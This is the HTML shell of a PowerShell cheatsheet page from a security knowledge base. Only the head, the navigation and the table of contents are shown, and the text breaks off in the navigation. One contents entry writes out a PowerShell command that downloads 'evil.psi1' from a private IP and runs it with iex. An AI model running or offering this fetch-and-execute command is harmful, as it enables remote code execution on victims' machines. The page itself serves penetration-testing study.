



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Cheatsheet - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#cheatsheet" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Cheatsheet
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../../../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../databases-sqlserver/" title="Databases sqlserver" class="md-nav__link">
      Databases sqlserver
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../dfir/" title="Dfir" class="md-nav__link">
      Dfir
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../osint/" title="Osint" class="md-nav__link">
      Osint
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../rf-and-sdr/" title="Rf and sdr" class="md-nav__link">
      Rf and sdr
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../windows-active-directory/" title="Windows active directory" class="md-nav__link">
      Windows active directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27" type="checkbox" id="nav-27">
    
    <label class="md-nav__link" for="nav-27">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-27">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/cissp/" title="Cissp" class="md-nav__link">
      Cissp
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/osce/" title="Osce" class="md-nav__link">
      Osce
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3" type="checkbox" id="nav-27-3">
    
    <label class="md-nav__link" for="nav-27-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-27-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3-9" type="checkbox" id="nav-27-3-9">
    
    <label class="md-nav__link" for="nav-27-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-27-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3-9-10" type="checkbox" id="nav-27-3-9-10">
    
    <label class="md-nav__link" for="nav-27-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-27-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-28" type="checkbox" id="nav-28">
    
    <label class="md-nav__link" for="nav-28">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-28">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../cloud/azuer/" title="Azuer" class="md-nav__link">
      Azuer
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29" type="checkbox" id="nav-29">
    
    <label class="md-nav__link" for="nav-29">
      Identity and access management
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-29">
        Identity and access management
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../identity-and-access-management/jwt/" title="Jwt" class="md-nav__link">
      Jwt
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../identity-and-access-management/kerberos/" title="Kerberos" class="md-nav__link">
      Kerberos
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../identity-and-access-management/oauth2-and-oidc/" title="Oauth2 and oidc" class="md-nav__link">
      Oauth2 and oidc
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30" type="checkbox" id="nav-30">
    
    <label class="md-nav__link" for="nav-30">
      Network
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-30">
        Network
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/discovery/" title="Discovery" class="md-nav__link">
      Discovery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/domain-fronting/" title="Domain Fronting" class="md-nav__link">
      Domain Fronting
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/port-forwarding-and-tunneling/" title="Port Forwarding" class="md-nav__link">
      Port Forwarding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/port-scanning/" title="Port Scanning" class="md-nav__link">
      Port Scanning
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/traffic-analysis/" title="Traffic Analysis" class="md-nav__link">
      Traffic Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/vulnerability-scanning/" title="Vulnerability Scanning" class="md-nav__link">
      Vulnerability Scanning
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/wireless/" title="Wireless" class="md-nav__link">
      Wireless
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/x-Defense/" title="x Defense" class="md-nav__link">
      x Defense
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/y-Tools-Netcat/" title="y Tools Netcat" class="md-nav__link">
      y Tools Netcat
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/y-Tools-Netstat/" title="y Tools Netstat" class="md-nav__link">
      y Tools Netstat
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/y-Tools-Nmap/" title="Nmap" class="md-nav__link">
      Nmap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../network/z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31" type="checkbox" id="nav-31" checked>
    
    <label class="md-nav__link" for="nav-31">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-31">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1" type="checkbox" id="nav-31-1" checked>
    
    <label class="md-nav__link" for="nav-31-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-31-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../api/" title="Windows API" class="md-nav__link">
      Windows API
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../applocker/" title="Applocker" class="md-nav__link">
      Applocker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../events/" title="Events" class="md-nav__link">
      Events
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../hyperv/" title="HyperV" class="md-nav__link">
      HyperV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../important-endpoints/" title="Important Endpoints" class="md-nav__link">
      Important Endpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../important-issues/" title="Important issues" class="md-nav__link">
      Important issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../important-reg-locations/" title="Important Registry Locations" class="md-nav__link">
      Important Registry Locations
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel-exploitation/" title="Kernel Exploitation" class="md-nav__link">
      Kernel Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../user-accounts/" title="User accounts" class="md-nav__link">
      User accounts
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../wmi/" title="Wmi" class="md-nav__link">
      Wmi
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../x-Bypass/" title="Defense Bypass" class="md-nav__link">
      Defense Bypass
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../x-Defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1-22" type="checkbox" id="nav-31-1-22">
    
    <label class="md-nav__link" for="nav-31-1-22">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-31-1-22">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1-23" type="checkbox" id="nav-31-1-23" checked>
    
    <label class="md-nav__link" for="nav-31-1-23">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-31-1-23">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Cheatsheet
      </label>
    
    <a href="./" title="Cheatsheet" class="md-nav__link md-nav__link--active">
      Cheatsheet
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#versions" class="md-nav__link">
    Versions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#help-system" class="md-nav__link">
    Help System
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#basic-constructs" class="md-nav__link">
    Basic Constructs
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#list-all-cmdlets" class="md-nav__link">
    List all Cmdlets
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aliases" class="md-nav__link">
    Aliases
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#check-environment" class="md-nav__link">
    Check Environment
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#download-files" class="md-nav__link">
    Download Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#base64-encoded-payload-delivery" class="md-nav__link">
    Base64 encoded payload delivery
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#execution-policy" class="md-nav__link">
    Execution Policy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#revserse-shell" class="md-nav__link">
    Revserse Shell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#modules" class="md-nav__link">
    Modules
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remote-script-execution" class="md-nav__link">
    Remote Script execution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hnew-object-comobject-msxm12xmlhttphopenget-http1921682301evilpsi1-falsehsendiex-h-responsetext" class="md-nav__link">
    $h=New-Object -ComObject Msxm12.XMLHTTP;$h.open(&#39;GET&#39;, &#39;http://192.168.230.1/evil.psi1&#39; ,$false);$h.send();iex $h. responseText
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-history-psreadline" class="md-nav__link">
    Command History (PSReadline)
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell-remoting" class="md-nav__link">
    Powershell Remoting
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wsman-webservicesmanagement-protocol-winrm" class="md-nav__link">
    WSMAN (WebServicesManagement) Protocol (WinRM)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wsman-vs-powershell-remoting-vs-wmi" class="md-nav__link">
    WSMAN vs PowerShell Remoting vs WMI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#one-to-one" class="md-nav__link">
    One to One
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-cmdlets" class="md-nav__link">
    Useful cmdlets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#one-to-many-fan-out-remoting" class="md-nav__link">
    One to Many (Fan-out Remoting)
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#load-powerup" class="md-nav__link">
    Load PowerUp
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    Active Directory
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#system-information" class="md-nav__link">
    System Information
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#jobs" class="md-nav__link">
    Jobs
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#net" class="md-nav__link">
    .Net
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploring-assemblies" class="md-nav__link">
    Exploring Assemblies
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#assemblyname" class="md-nav__link">
    AssemblyName
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#typedefinition" class="md-nav__link">
    TypeDefinition
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#memberdefinition-dll-import" class="md-nav__link">
    MemberDefinition - DLL Import
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#com-objects" class="md-nav__link">
    COM Objects
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-32" type="checkbox" id="nav-32">
    
    <label class="md-nav__link" for="nav-32">
      Protocols and ports
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-32">
        Protocols and ports
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Citrix-1494/" title="Citrix 1494" class="md-nav__link">
      Citrix 1494
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/DHCP/" title="DHCP" class="md-nav__link">
      DHCP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/DNS-53/" title="DNS 53" class="md-nav__link">
      DNS 53
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/ElasticSearch-9200/" title="Interesting APIs" class="md-nav__link">
      Interesting APIs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/FTP-21/" title="FTP 21" class="md-nav__link">
      FTP 21
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/Finger-79/" title="Finger 79" class="md-nav__link">
      Finger 79
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/HTTP-HTTPS-80,443/" title="HTTP HTTPS 80,443" class="md-nav__link">
      HTTP HTTPS 80,443
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/IMAP-143,993/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../protocols-and-ports/IRC-8067/" title="IRC 8067" class="md-nav__link">
      IRC 8067
